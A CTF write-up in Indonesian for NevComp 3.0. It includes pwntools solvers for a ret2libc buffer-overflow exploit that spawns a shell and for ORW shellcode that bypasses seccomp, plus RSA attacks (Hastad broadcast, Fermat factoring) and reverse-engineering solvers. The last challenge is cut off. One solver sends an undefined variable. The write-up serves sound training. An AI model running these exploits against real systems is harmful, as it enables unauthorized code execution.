# NEVCOMP 3.0

Fon37 Writeup Nevcomp 3.0

## Categories
- Pwn/Binary Exploitation
   - [Simple Login](#simple-login)
   - [Vault](<#vault>)
- Crypto
   - [Broken_Broadcast](#broken-broadcast)
   - [Too Close](#too-close)
   
   
- Reverse Engineering
   - [Scrambled Bytes](#scrambled-bytes)
   - [Trace Me If You Can ](#trace-me-if-you-can)



# Simple Login
Category: PWN

Points: 1000 PTS

Solves: 1

Challenge Description: 

    login login login

    nc 172.20.12.248:1337

Artifact Files:
* [chall]()

## Solution
Pertama-tama kita reverse dulu chall nya menggunakan IDA
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[64]; // [rsp+0h] [rbp-60h] BYREF
  char s[32]; // [rsp+40h] [rbp-20h] BYREF

  setvbuf(stream: stdin, buf: nullptr, modes: 2, n: 0);
  setvbuf(stream: stdout, buf: nullptr, modes: 2, n: 0);
  setvbuf(stream: stderr, buf: nullptr, modes: 2, n: 0);
  puts(s: "Username: ");
  fgets(s, n: 32, stream: stdin);
  s[strcspn(s, reject: "\n")] = 0;
  strncpy(dest: welcome_name, src: s, n: 0x1Fu);
  byte_4040BF = 0;
  puts(s: "Password: ");
  gets(a1: v4);
  printf(format: "Welcome %s", welcome_name);
  return 0;
}
```
Di sini program menggunakan fungsi gets yang mana tidak aman dan bisa terjadi overflow.

Saya menggunakan cyclic untuk menemukan offset dari ret nya dan didapat offset 135.
```
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   45 Symbols        No    0      4chall
```

Kemudian saya cek protectionnya, di sini ada NX enabled, jadi shellcode tidak bisa. Karena ada No PIE dan kisi-kisi ctf nya ada ret2libc, di sini saya mencoba pendekatan blind libc dengan leak fungsi puts dan setvbuf.

**Solver Leak puts dan setvbuf**
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("172.20.12.248", 1337)

    return r


def main():
    r = conn()


    PUTS_PLT = exe.plt['puts']
    PUTS_GOT = exe.got['puts']
    SETBUF_GOT = exe.got['setvbuf']
    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    MAIN = exe.symbols['main']

    log.info("Puts@plt: " + hex(PUTS_PLT))
    log.info("Pop rdi gadget: " + hex(POP_RDI))

    OFFSET = ("A"*135).encode() 

    payload1 = OFFSET
    payload1 += p64(POP_RDI) 
    payload1 += p64(SETBUF_GOT) 
    payload1 += p64(PUTS_PLT)
    payload1 += p64(MAIN) 

    r.sendline(payload1)
    r.recvline()
    r.recvline()
    recieved = r.recvline().strip()
    print(recieved)
    leak_bytes = recieved.split(b'A' * 31)[1]
    leak = u64(leak_bytes.ljust(8, b'\x00'))
    log.info("Setbuf LEAK: " + hex(leak))

    payload2 = OFFSET
    payload2 += p64(POP_RDI)
    payload2 += p64(PUTS_GOT) 
    payload2 += p64(PUTS_PLT)
    payload2 += p64(MAIN)
    r.sendline(payload2)
    r.recvline()
    r.recvline()

    recieved = r.recvline().strip()
    leak_bytes = recieved.split(b'A' * 31)[1]
    leak = u64(leak_bytes.ljust(8, b'\x00'))
    log.info("PUTS LEAK: " + hex(leak))


    r.interactive()


if __name__ == "__main__":
    main()

```
**output:**
```
[*] Loaded 6 cached gadgets for './chall_patched'
[+] Opening connection to 172.20.12.248 on port 1337: Done
[*] Puts@plt: 0x401040
[*] Pop rdi gadget: 0x401287
b'Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0\x96)\xb1\x0e\x7f'
[*] Setbuf LEAK: 0x7f0eb1299630
[*] PUTS LEAK: 0x7f0eb1298cc0
[*] Switching to interactive mode
```
nah di sini kita dapat leaknya, di mana 3 byte terakhirnya selalu sama. Di sini saya mencoba input ke 3 byte terakhirnya ke [database libc](<https://libc.rip/>).
Setelah mencari libc yang sesuai, saya menemukan libc6_2.39-0ubuntu8.9_amd64 adalah libc yang dipakai di server.

Sekarang tinggal di leak aja deh libc base addresnya dan spawn /bin/sh.

**Solver:**
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./libc6_2.39-0ubuntu8.9_amd64.so")
context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("172.20.12.248", 1337)

    return r


def main():
    r = conn()


    PUTS_PLT = exe.plt['puts']
    PUTS_GOT = exe.got['puts']
    SETBUF_GOT = exe.got['setvbuf']
    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    RET = (rop.find_gadget(['ret']))[0] 
    MAIN = exe.symbols['main']

    log.info("Puts@plt: " + hex(PUTS_PLT))
    log.info("Pop rdi gadget: " + hex(POP_RDI))

    OFFSET = ("A"*135).encode()
    payload1 = OFFSET
    payload1 += p64(POP_RDI) 
    payload1 += p64(SETBUF_GOT) 
    payload1 += p64(PUTS_PLT)
    payload1 += p64(MAIN)

    r.sendline(payload1)
    r.recvline()
    r.recvline()
    recieved = r.recvline().strip()
    print(recieved)
    leak_bytes = recieved.split(b'A' * 31)[1]
    leak = u64(leak_bytes.ljust(8, b'\x00'))
    log.info("Setbuf LEAK: " + hex(leak))

    payload2 = OFFSET
    payload2 += p64(POP_RDI)
    payload2 += p64(PUTS_GOT) 
    payload2 += p64(PUTS_PLT)
    payload2 += p64(MAIN)

    r.sendline(payload2)
    r.recvline()
    r.recvline()
    recieved = r.recvline().strip()
    leak_bytes = recieved.split(b'A' * 31)[1]
    leak = u64(leak_bytes.ljust(8, b'\x00'))
    log.info("PUTS LEAK: " + hex(leak))

    libc.address = leak - libc.sym["puts"]
    #build binsh
    BINSH = next(libc.search("/bin/sh"))
    SYSTEM = libc.sym["system"]

    PAYLOAD3 = OFFSET
   # PAYLOAD3 += p64(RET)
    PAYLOAD3 += p64(POP_RDI)
    PAYLOAD3 += p64(BINSH)
    PAYLOAD3 += p64(RET)
    PAYLOAD3 += p64(SYSTEM)
    r.sendline(PAYLOAD3)

    r.interactive()


if __name__ == "__main__":
    main()

```
**OUTPUT**
```
Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ ls
chall
core
flag.txt
$ cat flag.txt
NevComp3.0{basic_ret2libc_ggwp...sengaja_gk_kasih_libc_biar_cari_libc_nya_sendiri_fdec58ec61d}$  
```
FLAG : NevComp3.0{basic_ret2libc_ggwp...sengaja_gk_kasih_libc_biar_cari_libc_nya_sendiri_fdec58ec61d}


# Vault
Category: PWN

Points: 1000 PTS

Solves: 1

Challenge Description: 

    chall ramah
    nc 172.20.12.248:1338

Artifact Files:
* [chall]()
* [Dockerfile]()
* [docker-compose.yml]()

## Initial analysis
Diberikan file chall 64 bit dan dockerfilenya. Berikut decompile dari IDA
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *v3; // rax
  void *v4; // rbx

  setvbuf(stream: stdin, buf: nullptr, modes: 2, n: 0);
  setvbuf(stream: stdout, buf: nullptr, modes: 2, n: 0);
  setvbuf(stream: stderr, buf: nullptr, modes: 2, n: 0);
  v3 = mmap(addr: nullptr, len: 0x1000u, prot: 7, flags: 34, fd: -1, offset: 0);
  if ( v3 == (void *)-1LL )
    main_cold();
  v4 = v3;
  __printf_chk(a1: 1, a2: "Give me payload: ");
  read(fd: 0, buf: v4, nbytes: 0x1000u);
  setup_seccomp();
  ((void (*)(void))v4)();
  return 0;
}
```
Nah kalau kita liat di sini program meminta kita payload(shellcode), ada pula shellcode yang bisa kita gunakan adalah:
```
┌──(alfonkali㉿fon)-[/mnt/d/cyber/nevtik/nevcomp_2027/PWN/shellcode]
└─$ seccomp-tools dump ./chall
Give me payload: ada
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
 0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
 0007: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0012
 0008: 0x15 0x03 0x00 0x0000003c  if (A == exit) goto 0012
 0009: 0x15 0x02 0x00 0x000000d9  if (A == getdents64) goto 0012
 0010: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0012
 0011: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

Dari output seccomp, hampir pasti shellcode yang perlu kita buat adalah teknik ORW(Open, Read, Write). Namun masalahnya, di Dockerfile kita mengetahui bahwa nama file flag menjadi random ketika dideploy, sehingga kita perlu mengetahui nama filenya terlebih dahulu
```
RUN random=$(openssl rand -hex 32) && echo "NevComp3.0{REDACTED}" > /home/ctf/flag-${random}.txt
```

## Solution
Solusi nya adalah kita bisa menggunakan getdents64 untuk mengetahui nama file flagnya terlebih dahulu, kemudian menjalan ORW biasa.
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("172.20.12.248", 1338)

    return r


def main():
    r = conn()

    shellcode = shellcraft.open('./')
    shellcode += shellcraft.getdents64(3, 'rsp', 0x200)
    shellcode += shellcraft.write(1, 'rsp', 0x200)

    r.send(compiled_shellcode)
    r.interactive()


if __name__ == "__main__":
    main()

```
Output:
```
Give me payload: \xbc\x01\x17\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04..\x00\x00\x00\xbe\x01\x17\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04.\x00\x7f\x00\x00\xbf\x01\x17\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00 \x00\x08.bash_logout\x00\xc0\x01\x17\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00 \x00\x08.bashrc\x00\x00\x00\x00\x00\x00\xc1\x01\x17\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00 \x00\x08.profile\x00\xba\x8e
\xe9H\x11\x1c\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x18\x00\x08core\x00\xc2\x01\x17\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00`\x00\x08flag-8ae0f881fe758b98ef5bd3d2bff3d0e7e95019996b2847f37be2c8e97adb00c0.txt\x00V\x00\x00\xc3\x01\x17\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00 \x00\x08chall\x00\x00\x00\x00\x00\x00\x00\x00\x11\xc2\xe2\xc9\x04V\x00\x00X\xcd\xcbB\xfc\x7f\x00\x008\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xda\xee\xcbB\xfc\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xea\xee\xcbB\xfc\x7f\x00\x00,\xef\xcbB\xfc\x7f\x00\x00B\xef\xcbB\xfc\x7f\x00\x00M\xef\xcbB\xfc\x7f\x00\x00X\xef\xcbB\xfc\x7f\x00\x00e\xef\xcbB\xfc\x7f\x00\x00r\xef\xcbB\xfc\x7f\x00\x00\x88\xef\xcbB\xfc\x7f\x00\x00\xa2\xef\xcbB\xfc\x7f\x00\x00\xb6\xef\xcbB\xfc\x7f\x00\x00\xd3\xef\xcbB\xfc\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\xd0\xcfB\xfc\x7f\x00\x003\x00\x00\x00\x00\x00\x00\x00\xa0\x05\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\xff\xfb\x8b\x17\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00$        
```
Dari output tersebut, didapat nama flagnya adalah 

flag-8ae0f881fe758b98ef5bd3d2bff3d0e7e95019996b2847f37be2c8e97adb00c0.txt


Tinggal di baca aja deh flagnya dengan teknik ORW
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("172.20.12.248", 1338)

    return r


def main():
    r = conn()

    # shellcode = shellcraft.open('./')
    # shellcode += shellcraft.getdents64(3, 'rsp', 0x200)
    # shellcode += shellcraft.write(1, 'rsp', 0x200)

    shellcode = shellcraft.open('flag-8ae0f881fe758b98ef5bd3d2bff3d0e7e95019996b2847f37be2c8e97adb00c0.txt')
    shellcode += shellcraft.read('rax', 'rsp', 100)
    shellcode += shellcraft.write(1, 'rsp', 100)
    compiled_shellcode = asm(shellcode)

    r.send(compiled_shellcode)
    r.interactive()


if __name__ == "__main__":
    main()

```
Output:
```
[+] Opening connection to 172.20.12.248 on port 1338: Done
[*] Switching to interactive mode
Give me payload: NevComp3.0{0gw_&_0rw_sh3llc0d3_e3sy_r1ght?_099f82d7d4}
```
Flag: NevComp3.0{0gw_&_0rw_sh3llc0d3_e3sy_r1ght?_099f82d7d4}

# Broken Broadcast
Category: Crypto

Points: 1000 PTS

Solves: 3

Challenge Description: 

    A secret repeated too many times ceases to be a secret.

    nc 172.20.12.248:1111

Artifact Files:
* [chall.py]()

## Initial analysis
```python
import time
from Crypto.Util.number import getPrime, bytes_to_long

FLAG = b"NevComp3.0{REDACTED}"

def generate():
    e = 11
    p = getPrime(512)
    q = getPrime(512)
    n = p * q
    return n, e

def main():
    time.sleep(0.3) 
    
    n, e = generate()
    m = bytes_to_long(FLAG)
    ct = pow(m, e, n)
    
    print(f"n = {n}")
    print(f"e = {e}")
    print(f"ct = {ct}")

if __name__ == "__main__":
    main()
```

Diberikan source code RSA generator yang mana dia mengenkripsi flag dengan public key e 11 dan n yang berbeda beda ketika dijalankan. Dari sini aja kita sudah tau kalau ini termasuk ke Hastad Attack.

Hastad attack itu intinya persamaan ini
```math
m^{11} ≡ c_1[n_1]
```
```math
m^{11} ≡ c_2[n_2]
```
```math
m^{11} ≡ c_3[n_3]
```
Dan seterusnya.

Dari situ kita bisa mencari third rootnya menggunakan Chinese Remainder Theorem yang mana terdapat solusi di mana x adalah:
```math
x ≡ m^{11}[n_1 × n_2 × n_3 × ...]
```

Dari sini tujuannya adalah menemukan X dan cari third root dari X untuk mendapatkan plaintext.
## Solution
Kita kumpulkan dulu masing-masing ciphertext dan modulusnya(di sini saya ambil 6 saja) dan kita compute aja third rootnya

```python
from Crypto.Util.number import long_to_bytes
from gmpy2 import iroot
from sympy.ntheory.modular import crt

e = 11
n1 = 130248496679852530002857142342477040877044450994946313467953048374385708930107623054055674020172662579809691614978744056749567998213854839501056164111889197561959801702753695739335888892502168642269307782916249993384369923825668971182127242467031262740051539295904767653946909376847198740035435055920227658899
c1 = 36640237245010444509212150384705661681044476172739142852577999868219379368726901265487534607872801396392096077619578320425756640716239407408967840860096677523244727508718720302563081394084288723708041928044431131234846536382445764914315901118362277942463742484337937045970639142050715845994342322188262184905
n2 = 140741648084156244980058888063517208615819139195974686786191620766488415071751708132893024087283759672346693638847157389828990836419013151879736368637268083682414996485630326926909378591939423913205902451099289283912996750497337116579534034003733819663967405080510744358654677469648563624985404510008924860923
c2 = 97026587296243723419867025232061070216019387719873641545516068241682936247557517900530179302356017374317668788901367069631327239661688693129810734816357513384681791629158781931501993637596722792390892781500960790695544353529488287086453309344952888744122137692136874433144705308741189485598507079939596241423
n3 = 89692715253281660296008705208724259204874776131601027615398204338637736369569395774985824499662595950986893418519644276990295902931111598573267897978504258752890617081953792322554112353330573794047520012808773332833409593933119770547379389538167039137415334883008445629087014188232289988661512752614367951559
c3 = 13918426787175118673005297058899938352940721224428981380514006548061771225283821996204154413384204914192692804917709398034826484726884993905552629496527519080912700975667756505365494267703557425235534557811079779501091518053055103953153767598596809677936225358570513743284377985989400906774278919391557112803
n4 = 101902223858821105549844415569613204552215076483844203677138564825876575934691997760529197090957131017020121531437677495423711131826115390265071637558447741506854141857614587467106086445047570631104724604723770533818620983298566739339864003735251807938746476731418960836802228262059391267626528323977093970681
c4 = 59409954709657212651050967653392017995152538720121766025037849005045639821610383996003625033559805270731359103393374653628536795494702697850155380880796241005135205472329225450323646740378547677207368705256102875006045092781864830445244347490228996678763762224357462992044449232554519663286347026991816608300
n5 = 122394349025495244615286216014447287327998338921954850263970231075742427673293414688426981418158049736161683101302810081937780646619623457586071216943489627572461506351197000936613494301890310167706492743049348066969182453256341844141429259045319810989433147215048536093772728036414592532749297274124172615519
c5 = 12023128964491719039873070736816688451419541949228598061304389600176400954814377460929109944166152247326088996819208374579240796881260010429792843927867291645844245910390937400011287620843906469581838491977890975472861177627533404472368796532578624506352208397454444524194911462298770640419099945310047926437
n6 = 69662333603935873694873742274698556946932122876680409051793167501280132762590646162317200020584418025976597516513854332075735916567999558668435765842374979184426305983000470391889306962730822989592957442740863606651963989575749408593818687590618954034702551468690683395601291195387959661474780435363383049393
c6 = 36693270889853972938055503407013622744375640556224248235385952935189302548040598783112064887633282167398054692259329287235650423240982238656069223912360511870249020313244578367963931831642883137393509820348355024628922842351056053570834239887876113587671092963811745180523874054950422452861490442397754840291
def third_root(n):
    m, valid = iroot(n, e)
    if valid:
        print("Cleartext :", long_to_bytes(m))
    else:
        print("Unable to find the third root of :", n)

C = [c1, c2, c3, c4, c5, c6]
N = [n1, n2, n3, n4, n5, n6]

for c in C:
    third_root(c)

x, _ = crt(N, C) 
third_root(int(x))
```
```
Cleartext : b'NevComp3.0{stop_shouting_the_same_secret_everywhere}'
```
FLAG : NevComp3.0{stop_shouting_the_same_secret_everywhere}

# Too Close
Category: Crypto

Points: 888 PTS

Solves: 3

Challenge Description: 

    Keep your friends close, but your prime numbers far apart😂

Artifact Files:
* [chall.py]()
* [output]()

## Initial analysis
```python
from Crypto.Util.number import getPrime, isPrime, bytes_to_long

flag = b"NevComp3.0{REDACTED}"

e = 65537

p = getPrime(1024)

q = p + 2
while not isPrime(q):
    q += 2

n = p * q
ct = pow(bytes_to_long(flag), e, n)

print(f"n = {n}")
print(f"e = {e}")
print(f"ct = {ct}")
```
Di chall.py terlihat bahwa q = p + 2. Hal ini tidak aman dikarenakan selisih p dan q menjadi kecil sehingga nilai $\sqrt{N}$ menjadi sangat dekat dengan rata-rata p dan q.

Kita tau bahwa
```math
N = pq = p(p+2) = p^2 + 2p
```
Dari sini dapat kita susun persamaan kuadratnya
```math
p^2 + 2p - n = 0
```
Sehingga
```math
p = \sqrt{N+1} - 1
```
```math
q = p + 2
```
## Solution
Nah di sini kita tinggal faktorkan N nya aja dengan fermat_factor dengan mencari p dan q yang valid sesuai persamaan tadi.
```python
from Crypto.Util.number import *
import math 
import gmpy2
n = 12296437781432367311023394758533510454946268500185385992227716630445727601995910584314842968521352928227417314138385153816557910124048235578185281770990602632417693715625716944046546995632402886484052356513955659794168812964244537524215160645997214883109044647118282844107377690817730069148831583875509687171166607636711923301642447273052010761189267417855147935085641005824593928642859430819905675163057334815302750221807023117394278667914383811255229398918761560855533965666048321785435258462071010641764308704434016691691446433040864905681347049751365476346536727422417330805750541068009315787797659054553806050761
e = 65537
c = 2706575227493480410193643242745348592600280204888962584838945538811218498594014079972573166027658915211182006780745516151414373780297579950963508704524787238237625136485194232117022505966137585958203864567478367358102010606598844210984608742740443391759475830316782384123595264135200068314220159801897121654032518596467748273656293752497783372691976659471604947370992855164196044676114401449243320485755613700859072763184207500484121805330637684859229686167044206697039071530979046264469720599675677518707486744013547639177601396378291289663765133222480555824691574082749730408943373773066561657135258601315929648796



def fermat_factor(n):
    # Mulai dari akar kuadrat N dibulatkan ke atas
    x = gmpy2.isqrt(n)
    if x * x < n:
        x += 1
    
    while True:
        y2 = x*x - n
        if gmpy2.is_square(y2):
            y = gmpy2.isqrt(y2)
            p = x - y
            q = x + y
            return int(p), int(q)
        x += 1
print(fermat_factor(n))
p = 110889304179584278384382689044986930982591620481454083805450010180644699172384670769410511585348509242105210246310510081991517491438575314911400652868789749525214578404312319661839632384998167774863134774474255623598831161904388535182540316858232522084115456966719179347744246926622174727447775135176571905719
q = 110889304179584278384382689044986930982591620481454083805450010180644699172384670769410511585348509242105210246310510081991517491438575314911400652868789749525214578404312319661839632384998167774863134774474255623598831161904388535182540316858232522084115456966719179347744246926622174727447775135176571905919

phi = (p-1) * (q-1)
d = pow(e,-1,phi)
print(long_to_bytes(pow(c, d, n)))
```

## Scrambled Bytes
Category: Reverse

Points: 1000 PTS

Solves: 1

Challenge Description: 

    let him cook



Artifact Files:
* [chall]()

## Initial analysis
```c

void FUN_001011a7(char *param_1)

{
  size_t sVar1;
  byte local_88 [123];
  byte local_d;
  uint local_c;
  
  local_88[0x30] = 0x3d;
  local_88[0x31] = 0x9d;
  local_88[0x32] = 0xe;
  local_88[0x33] = 0xba;
  local_88[0x34] = 0x8f;
  local_88[0x35] = 0xf;
  local_88[0x36] = 0x11;
  local_88[0x37] = 0x83;
  local_88[0x38] = 0xbc;
  local_88[0x39] = 0xad;
  local_88[0x3a] = 0x2a;
  local_88[0x3b] = 9;
  local_88[0x3c] = 0xa1;
  local_88[0x3d] = 0x29;
  local_88[0x3e] = 7;
  local_88[0x3f] = 0x24;
  local_88[0x40] = 0x12;
  local_88[0x41] = 9;
  local_88[0x42] = 0x17;
  local_88[0x43] = 0xa5;
  local_88[0x44] = 0xbf;
  local_88[0x45] = 0x8a;
  local_88[0x46] = 0xb5;
  local_88[0x47] = 0x2a;
  local_88[0x48] = 0x37;
  local_88[0x49] = 0x26;
  local_88[0x4a] = 0x2f;
  local_88[0x4b] = 0x1b;
  local_88[0x4c] = 0xc5;
  local_88[0x4d] = 0xba;
  local_88[0x4e] = 0xbd;
  local_88[0x4f] = 0x2d;
  local_88[0x50] = 0xa9;
  local_88[0x51] = 0xb1;
  local_88[0x52] = 0x33;
  local_88[0x53] = 0x2b;
  local_88[0x54] = 0x40;
  local_88[0x55] = 0x3e;
  local_88[0x56] = 0xab;
  local_88[0x57] = 0x9d;
  local_88[0x58] = 0xaf;
  local_88[0x59] = 0x3e;
  local_88[0x5a] = 0xc0;
  local_88[0x5b] = 0x95;
  local_88[0x5c] = 0x37;
  local_88[0x5d] = 0x2f;
  local_88[0x5e] = 0x9c;
  local_88[0x5f] = 0x1a;
  local_88[0x60] = 0x32;
  local_88[0x61] = 0x48;
  local_88[0x62] = 0x50;
  local_88[99] = 0xb9;
  local_88[100] = 0xaf;
  local_88[0x65] = 0xa8;
  local_88[0x66] = 0xbb;
  local_88[0x67] = 0x53;
  local_88[0x68] = 0x1e;
  local_88[0x69] = 0x9d;
  local_88[0x6a] = 0xa0;
  local_88[0x6b] = 0xb3;
  local_88[0x6c] = 0x9e;
  local_88[0x6d] = 0xc9;
  local_88[0x6e] = 0xb7;
  local_88[0x6f] = 0xc5;
  local_88[0x70] = 0x4e;
  local_88[0x71] = 0x37;
  local_88[0x72] = 0x3f;
  local_88[0x73] = 0xcf;
  local_88[0x74] = 0xd0;
  local_88[0x75] = 0xa3;
  local_88[0x76] = 0x34;
  local_88[0] = 0x34;
  local_88[1] = 0x5f;
  local_88[2] = 0x6c;
  local_88[3] = 0x31;
  local_88[4] = 0x74;
  local_88[5] = 0x74;
  local_88[6] = 0x6c;
  local_88[7] = 0x33;
  local_88[8] = 0x5f;
  local_88[9] = 0x62;
  local_88[10] = 0x31;
  local_88[0xb] = 0x74;
  local_88[0xc] = 0x5f;
  local_88[0xd] = 0x30;
  local_88[0xe] = 0x66;
  local_88[0xf] = 0x5f;
  local_88[0x10] = 0x78;
  local_88[0x11] = 0x30;
  local_88[0x12] = 0x72;
  local_88[0x13] = 0x5f;
  local_88[0x14] = 0x34;
  local_88[0x15] = 0x6e;
  local_88[0x16] = 100;
  local_88[0x17] = 0x5f;
  local_88[0x18] = 0x34;
  local_88[0x19] = 0x5f;
  local_88[0x1a] = 0x77;
  local_88[0x1b] = 0x68;
  local_88[0x1c] = 0x30;
  local_88[0x1d] = 0x6c;
  local_88[0x1e] = 0x33;
  local_88[0x1f] = 0x5f;
  local_88[0x20] = 0x6c;
  local_88[0x21] = 0x30;
  local_88[0x22] = 0x74;
  local_88[0x23] = 0x5f;
  local_88[0x24] = 0x30;
  local_88[0x25] = 0x66;
  local_88[0x26] = 0x5f;
  local_88[0x27] = 0x73;
  local_88[0x28] = 0x68;
  local_88[0x29] = 0x31;
  local_88[0x2a] = 0x66;
  local_88[0x2b] = 0x74;
  local_88[0x2c] = 0x31;
  local_88[0x2d] = 0x6e;
  local_88[0x2e] = 0x67;
  local_88[0x2f] = 0;
  sVar1 = strlen(param_1);
  if (sVar1 == 0x47) {
    for (local_c = 0; local_c < 0x47; local_c = local_c + 1) {
      local_d = (local_88[(ulong)(long)(int)local_c % 0x2f] ^ param_1[(int)local_c]) + (char)local_c
      ;
      local_d = FUN_00101159(local_d);
      local_d = FUN_00101176(local_d,5);
      if (local_d != local_88[(long)(int)local_c + 48]) {
        puts("I think you missed a column, try again");
        return;
      }
    }
    puts("You Win! That\'s the correct flag.");
  }
  else {
    puts("Invalid Length");
  }
  return;
}
```
```c

uint FUN_00101159(byte param_1)

{
  return (uint)param_1 << 4 | (uint)(param_1 >> 4);
}
```
```c
uint FUN_00101176(byte param_1,byte param_2)

{
  return (uint)param_1 << (8 - param_2 & 0x1f) | (int)(uint)param_1 >> (param_2 & 0x1f);
}

```
Di sini program membandingkan input yang dicompute dengan beberapa step bit scramble dengan ciphertext hasilnya. Terdapat juga key "4_l1ttl3_b1t_0f_x0r_4nd_4_wh0l3_l0t_0f_sh1ft1ng" yang nantinya akan menjadi key dari repeating xor. Langkah-langkah compute nya adalah:
```python
    step1 = input ^ key[i % len(key)]
    step2 = step1 - i & 0xff
    step3 = rol(step2, 4, 8)
    ciphertext = ror(step3, 5, 8)
```
Dari sini tinggal kita balik aja menjadi
```python
    step1 = rol(target[i],5, 8)
    step2 = ror(step1, 4, 8)
    step3 = step2 - i & 0xff
    step4 = step3 ^ key[i % len(key)]
    pt += chr(step4)
```
## Solution
Berikut solvernya:
```python

 # return (a1 >> 4) | (16 * (unsigned int)a1);
target = [0x3d,0x9d,0xe,0xba,0x8f,0xf,0x11,0x83,0xbc,0xad,0x2a,9,0xa1,0x29,7,0x24,0x12,9,0x17,0xa5,0xbf,0x8a,0xb5,0x2a,0x37,0x26,0x2f,0x1b,0xc5,0xba,0xbd,0x2d,0xa9,0xb1,0x33,0x2b,0x40,0x3e,0xab,0x9d,0xaf,0x3e,0xc0,0x95,0x37,0x2f,0x9c,0x1a,0x32,0x48,0x50,0xb9,0xaf,0xa8,0xbb,0x53,0x1e,0x9d,0xa0,0xb3,0x9e,0xc9,0xb7,0xc5,0x4e,0x37,0x3f,0xcf,0xd0,0xa3,0x34,0x34,0x5f,0x6c,0x31,0x74,0x74,0x6c,0x33,0x5f,0x62,0x31,0x74,0x5f,0x30,0x66,0x5f,0x78,0x30,0x72,0x5f,0x34,0x6e,100,0x5f,0x34,0x5f,0x77,0x68,0x30,0x6c,0x33,0x5f,0x6c,0x30,0x74,0x5f,0x30,0x66,0x5f,0x73,0x68,0x31,0x66,0x74,0x31,0x6e,0x67,0]
from fonre import rep_xor, ror, rol

key = b"4_l1ttl3_b1t_0f_x0r_4nd_4_wh0l3_l0t_0f_sh1ft1ng"
print(len(target))
pt = ""
for i in range(len(target)):
    step1 = rol(target[i],5, 8)
    step2 = ror(step1, 4, 8)
    step3 = step2 - i & 0xff
    step4 = step3 ^ key[i % len(key)]
    pt += chr(step4)
print(pt)
#ocal_d = (local_88[(ulong)(long)(int)local_c % 0x2f] ^ param_1[(int)local_c]) + (char)local_c
```
Output:
```
┌──(alfonkali㉿fon)-[/mnt/d/cyber/nevtik/nevcomp_2027/RE]
└─$ python solver.py 
119
NevComp3.0{shuffl1ng_n1bbl3s_4nd_r0ll1ng_b1ts_l1k3_4_pr0f3ss10n4l_ch3f})øpð¸GDeÉ[j(9í<î
                                                                                       TV2¼2É

                                                                                             ÅQB
                                                                                                ¾

```
Flag: NevComp3.0{shuffl1ng_n1bbl3s_4nd_r0ll1ng_b1ts_l1k3_4_pr0f3ss10n4l_ch3f}

## Trace Me If You Can
Category: RE

Points: 1000 PTS

Solves: 1

Challenge Description: 

    ez lah ini, jgn terlalu ovt wkwk

Artifact Files:
* [chall]()

## Initial analysis
Saat saya decompile menggunakan IDA, terdapat program ini membandingkan input kita dengan ciphertext yang sudah dicompute.
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rcx
  size_t v4; // rdx
  char *v5; // rdi
  int v6; // ecx
  unsigned int v7; // edi
  __int64 v8; // r8
  int i; // [rsp+Ch] [rbp-ECh]
  char s1[112]; // [rsp+10h] [rbp-E8h] BYREF
  char s2[120]; // [rsp+80h] [rbp-78h] BYREF

  printf(format: "Enter the flag: ");
  if ( (unsigned int)__isoc23_scanf(a1: "%99s", s1) != 1 )
    return 1;
  v3 = 25;
  v4 = (unsigned int)len;
  v5 = s2;
  while ( v3 != 0 )
  {
    *(_DWORD *)v5 = 0;
    v5 += 4;
    --v3;
  }
  v6 = 0x1337BEEF;
  v7 = 0;
  while ( v7 < (unsigned int)v4 )
  {
